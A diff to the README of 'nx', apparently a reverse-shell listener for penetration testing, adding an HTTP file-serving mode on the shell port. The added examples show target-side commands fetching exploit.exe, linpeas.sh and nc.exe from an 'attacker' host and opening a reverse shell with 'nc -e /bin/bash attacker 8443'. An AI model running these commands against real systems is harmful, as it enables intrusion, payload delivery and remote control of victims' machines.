@@ -22,19 +22,21 @@ Usage:
   nx [OPTIONS]
 
 Application Options:
-      --auto     Attempt to auto-upgrade to a tty (deprecated: use --exec auto)
-      --exec=    Execute plugin script on connection
-  -i, --host=    Interface address on which to bind (default: 0.0.0.0)
-  -p, --port=    Port on which to bind (default: 8443)
-  -t, --target=  Tmux session name (default: nx)
-  -v, --verbose  Debug logging
-      --sleep=   adjust if --auto is failing (default: 500ms)
+      --auto       Attempt to auto-upgrade to a tty (deprecated: use --exec auto)
+      --exec=      Execute plugin script on connection
+  -i, --host=      Interface address on which to bind (default: 0.0.0.0)
+  -p, --port=      Port on which to bind (default: 8443)
+  -t, --target=    Tmux session name (default: nx)
+  -v, --verbose    Debug logging
+      --sleep=     adjust if --auto is failing (default: 500ms)
+  -d, --serve-dir= Directory to serve files from over HTTP
 ```
 
 ## Features
 
 - **Plugin system**: Use `--exec <plugin>` to run custom scripts on connection
 - **Auto-upgrade to TTY**: Use `--exec auto` (or deprecated `--auto` flag) to automatically upgrade your shell to a TTY
+- **Protocol multiplexing**: Serve files over HTTP on the same port as shell connections using `--serve-dir`
 - **XDG runtime paths**: Automatically uses XDG runtime directory for socket location
 - **Signal handling**: Properly handles signals and performs cleanup
 
@@ -69,16 +71,62 @@ whoami
 
 - **auto**: TTY upgrade script (equivalent to deprecated `--auto` flag)
 
+## Protocol Multiplexing
+
+nx can serve files over HTTP on the same port as shell connections. This allows you to host exploit files and catch shells on a single port, avoiding firewall restrictions.
+
+### HTTP File Serving
+
+Enable file serving by specifying a directory with the `-d` or `--serve-dir` flag:
+
+```bash
+# Start nx with file serving enabled
+nx -p 8443 -d ./files -v
+
+# From target machine - download files
+curl http://attacker:8443/exploit.exe -o exploit.exe
+wget http://attacker:8443/linpeas.sh
+
+# Shell connections still work normally
+nc -e /bin/bash attacker 8443
+```
+
+### Security Features
+
+- **Directory traversal protection**: Prevents access to files outside the serve directory
+- **Hidden file protection**: Blocks access to files starting with `.`
+- **Method validation**: Only GET requests are supported for file serving
+- **Path sanitization**: All paths are cleaned and validated
+
+### Mixed Operation Example
+
+```bash
+# Terminal 1: Start nx with both features
+nx -p 8443 -d ./tools -v
+
+# Terminal 2: Download a tool from target
+curl http://attacker:8443/nc.exe -o nc.exe
+
+# Terminal 3: Catch reverse shell
+nc -e /bin/bash attacker 8443
+```
+
+### HTTP Response Codes
+
+- `200 OK`: File served successfully
+- `404 Not Found`: File doesn't exist or is a directory
+- `405 Method Not Allowed`: Non-GET HTTP methods
+- `500 Internal Server Error`: Server-side errors
+
 ## How?
 
 unix domain sockets mannn
 
 ## ToDo
 - [x] ~~maybe a plugin system for sending commands on connection~~ ✅ **DONE**: Implemented plugin system with `--exec` flag
-- [x] some mechanism to auto-upgrade the shell to a TTY via tmux-send-keys or sourcing a script that just adds the keybinds, so that it's up to the user to fire off the upgrade
-- [ ] alternatively, multiplex the connection to allow `curl | sh` from the same port
+- [x] ~~some mechanism to auto-upgrade the shell to a TTY via tmux-send-keys or sourcing a script that just adds the keybinds, so that it's up to the user to fire off the upgrade~~ ✅ **DONE**: Auto-upgrade via `--exec auto`
+- [x] ~~alternatively, multiplex the connection to allow `curl | sh` from the same port~~ ✅ **DONE**: Protocol multiplexing with `--serve-dir`
+- [x] ~~multiplexing listener~~ ✅ **DONE**: HTTP/shell protocol detection on same port
 - [ ] handle stdio with the socket directly with `nx`, eliminating the need for `socat`
 - [ ] facilitate installing plugins dir to xdg
-- [ ] multiplexing listener
-  - [ ] same port, but detects plain revshell vs http request. could allow scripts to be `curl |sh`d instead of relying on `tmux send-keys`
-  - [ ] super simple chisel-light
+- [ ] super simple chisel-light functionality
